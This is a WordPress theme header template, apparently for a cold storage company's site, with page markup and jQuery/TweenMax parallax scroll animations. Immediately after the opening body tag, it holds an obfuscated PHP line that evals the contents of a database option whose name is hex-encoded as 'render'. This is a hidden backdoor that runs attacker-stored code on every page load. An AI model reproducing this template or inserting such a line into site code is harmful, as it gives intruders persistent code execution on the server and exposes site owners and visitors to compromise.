<!doctype html>  

<!--[if lt IE 7]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
<!--[if (IE 7)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9 lt-ie8"><![endif]-->
<!--[if (IE 8)&!(IEMobile)]><html <?php language_attributes(); ?> class="no-js lt-ie9"><![endif]-->
<!--[if gt IE 8]><!--> <html <?php language_attributes(); ?> class="no-js"><!--<![endif]-->
	
	<head>
		<meta charset="utf-8">
		
		<title><?php bloginfo('name'); ?> <?php wp_title(); ?></title>
		
		<!-- Google Chrome Frame for IE -->
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
		
		<!-- mobile meta (hooray!) -->
		<meta name="HandheldFriendly" content="True">
		<meta name="MobileOptimized" content="320">
		<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
		
		<!-- icons & favicons (for more: http://themble.com/support/adding-icons-favicons/) -->
		<link rel="shortcut icon" href="<?php echo get_template_directory_uri(); ?>/favicon.ico">
				
 		<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>">
		
		<!-- wordpress head functions -->
		<?php wp_head(); ?>
		<!-- end of wordpress head -->
			
		<!-- drop Google Analytics Here -->
		<!-- end analytics -->
		
		

		<link href="http://vjs.zencdn.net/c/video-js.css" rel="stylesheet"> <!-- BG video css for IE --> 		<!-- enqueue elsewhere or integrate -->
		<link rel='stylesheet' href='http://roeder.flirdevsite.com/wp-content/themes/bcs/library/geoff.css' type='text/css' media='all' /> <!-- Geoff's code to be integrated -->

		<!--
		PT: temporarily disabled to try an alternative (above, in scripts.js, and functions.php)

		<script type='text/javascript' src='/wp-content/themes/bcs/library/js/libs/jquery.videoBG.js'></script>
		
		<script type="text/javascript">
		
		jQuery(document).ready(function( $ ) {
	
			$('div.bg').videoBG({
				position:"fixed",
				zIndex:-1,
				mp4:'/wp-content/themes/bcs/library/video/bcs-bg.m4v',
				//ogv:'christmas_snow.ogv',
				//webm:'christmas_snow.webm',
				poster:'/wp-content/themes/bcs/library/images/home-bg-q30-3.jpg',
				opacity:0.5
	
			});
		});
	
	</script>
		-->
		
		<!-- jquery for parallax -->
		
		<!-- <script src="http://code.jquery.com/jquery-migrate-1.0.0.min.js" type="text/javascript"></script> -->
		
		<script src="/wp-content/themes/bcs/library/js/libs/TweenMax.min.js" type="text/javascript"></script>
		<script src="/wp-content/themes/bcs/library/js/libs/jquery.superscrollorama.js" type="text/javascript"></script>
		
		<script type="text/javascript">
		jQuery(document).ready(function( $ ) {
			var controller = $.superscrollorama();


			/* REF:
				.addTween(
					target,
					tween,
					duration,
					offset)
			target:   scroll position (number) or element (string or object)
			tween:    a Greensock animation tween object
			duration: scroll duration of tween in pixels (0 means autoplay)
			offset:   adjust the animation start point
			*/

			/* Start Advantages Parallax FX ******************/
			if( $( 'body' ).hasClass('page-advantages') ) {
				controller.addTween(
				'.bg-primary',
					(new TimelineLite())
						.append([
							TweenMax.to(
								$('img.wp-image-76'),
								1, {
									css:{top: "50"},
									ease:Quad.easeIn
								})
						]),
						900, 500
						);
				controller.addTween(
				'section.advantages-synergy',
					(new TimelineLite())
						.append([
						TweenMax.fromTo($('img.wp-image-82'), 1, 
							{css:{top: -200}, immediateRender:true}, 
							{css:{top: -400}}),
						TweenMax.fromTo($('img.wp-image-83'), 1, 
							{css:{top: 300}, immediateRender:true}, 
							{css:{top: -200}}),
						TweenMax.fromTo($('img.wp-image-81'), 1, 
							{css:{top: 800}, immediateRender:true}, 
							{css:{top: 200}})
		
						]),
						1900, -400
						);
				controller.addTween(
					'section.advantages-agility > .wrap',
					(new TimelineLite())
						.append([
							TweenMax.to(
								$('section.advantages-agility > .wrap > img'),
								1, {
									css:{opacity:1},
									ease:Quad.easeInOut
								})
							]),
							100, -100);
				// long barcodes animation
				controller.addTween(
				'section.advantages-technology',
					(new TimelineLite())
						.append([
						TweenMax.from($('#barcode-1'), 1, 
							{css:{left: -500}, ease:Quad.easeInOut}),
						TweenMax.from($('#barcode-2'), 1, 
							{css:{right: -500}, ease:Quad.easeInOut}),
						]),
						600, // scroll duration of tween
						-400
						);

				controller.addTween( // Star Symbol
				'section.advantages-technology > .wrap',
					(new TimelineLite())
						.append([
						TweenMax.from($('section.advantages-technology .wp-image-398'), 1, 
							{css:{opacity: 0, scale: '2'}, ease:Quad.easeInOut})
						]),
						700, -300
						);
				controller.addTween(
					'section.advantages-agility > .wrap',
							TweenMax.set(
								$('section.advantages-agility > .wrap > img'),
								{
									css:{position:'absolute',top:'20px','margin-top':'0'}, immediateRender:false
								}),
							0, 20);
			} /* End Advantages Parallax FX ******************/

			/* Start Services Parallax FX ******************/
			if( $( 'body' ).hasClass('page-services') ) {

				/* Services/Freezing */
				var startAt = 50;
				var endAt = 450;
				var relative = 146;
				var durationMove = 1700;
				var durationFade = 500;

				// hexagon h2
				controller.addTween(
				'section.services-freezing',
					(new TimelineLite())
						.append([
						TweenMax.fromTo($('section.services-freezing > .wrap'), 1, 
							{css:{opacity: 0}, immediateRender:true}, 
							{css:{opacity: 1}})
						]),
						durationFade // scroll duration of tween
						);
				// hexagon h2
				controller.addTween(
				'section.services-freezing',
					(new TimelineLite())
						.append([
						TweenMax.fromTo($('section.services-freezing h2'), 1, 
							{css:{top: startAt}, immediateRender:true}, 
							{css:{top: endAt}})
						]),
						durationMove // scroll duration of tween
						);
				// hexagon content
				controller.addTween(
				'section.services-freezing',
					(new TimelineLite())
						.append([
						TweenMax.fromTo($('#freezing'), 1, 
							{css:{top: startAt + relative}, immediateRender:true}, 
							{css:{top: endAt + relative}})
						]),
						durationMove // scroll duration of tween
						);
				// star // css:{opacity:0, scale: 0, rotation: 720},
				controller.addTween(
					'section.services-freezing #freezing',
					TweenMax.from(
						$('#freezing > img'),
						1, {
							css:{opacity:0, scale:.5},
							ease:Quad.easeOut
						}));
				controller.addTween(
					'section.services-customized-space p',
					TweenMax.from(
						$('section.services-customized-space > .wrap > img'),
						1, {
							css:{top:280, right: 40},
							ease:Quad.easeOut
						}));
				controller.addTween(
				'section.services-marine-services',
					TweenMax.fromTo($('section.services-marine-services'), 2,
						{css:{'background-position-x': '55%'},
						ease:Quad.easeInOut}, 
						{css:{'background-position-x': '45%'}}),
						1200, -200 // scroll duration of tween
					);
				controller.addTween(
				'section.services-special-services',
						TweenMax.from(
							$('section.services-special-services > .wrap'),
							1,
							{css:{top:'-810px'}, ease:Quad.easeOut}
							),
						null,
						200
					);

			}	/* End Services Parallax FX ******************/
		});
		</script>

		
	</head>
	
	<body <?php is_front_page() ? body_class() : body_class( 'page-' . get_the_slug() ); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
	
	
<?php if( is_front_page() ) { ?>
<video id="big-video-wrap" class="video-js vjs-default-skin" 
	autoplay 
	loop 
	width="" 
	height="" 
	preload="auto" 
	poster="/wp-content/themes/bcs/library/images/home-bg-q30-3.jpg"
  data-setup="{}">
  <source src="/wp-content/themes/bcs/library/video/bcs-bg.m4v" type='video/mp4'>
<!--   <source src="/wp-content/themes/bcs/library/video/bcs-video.mp4" type='video/mp4'> -->
<!--  <source src="/wp-content/themes/bcs/library/video/bcs-bg.ogg" type='video/ogg'> need to add ogg and ideally webm also -->
	<img src="/wp-content/themes/bcs/library/images/home-bg-q30-3.jpg" alt="Background image showing rapid warehouse operations.">
</video>
<?php }  ?>


		<!-- FS BG IMAGE - - deprecated in favor of FS video  BG -->
		<?php /*if( is_front_page() ) { ?>
<!--<div class="bg">
			<img src="<?php echo get_template_directory_uri(); ?>/library/images/home-bg-q30-3.jpg"> 
		</div>-->
		<?php } */ ?>

		<div id="container">
			
			<header class="header" role="banner">
			
				<div id="inner-header" class="wrap clearfix">
					
					<!-- to use a image just replace the bloginfo('name') with your img src and remove the surrounding <p> -->
					<a id="logo" href="<?php echo home_url(); ?>" rel="nofollow">
						<img src="<?php echo get_template_directory_uri(); ?>/library/images/bellingham-cold-storage-logo.png"></a>
					
					<!-- if you'd like to use the site description you can un-comment it below -->
					<?php // bloginfo('description'); ?>
					
					
					<nav role="navigation">
						<?php bones_main_nav(); ?>
					</nav>
				
				</div> <!-- end #inner-header -->
			
			</header> <!-- end header -->
